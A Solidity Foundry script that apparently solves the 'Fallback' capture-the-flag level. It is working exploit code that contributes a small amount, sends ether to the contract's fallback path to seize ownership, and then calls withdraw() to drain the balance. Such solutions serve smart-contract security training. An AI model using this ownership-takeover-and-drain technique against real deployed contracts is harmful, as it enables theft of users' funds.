// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(<contractAddressHere>));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 0.0001 ether}();

        (bool success,) = address(fallbackInstance).call{value: 0.0001 ether}("");
        require(success, "Fallback call failed");

        console.log("Owner:", fallbackInstance.owner());
        console.log("Address:", vm.envAddress("MY_ADDRESS"));

        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }
}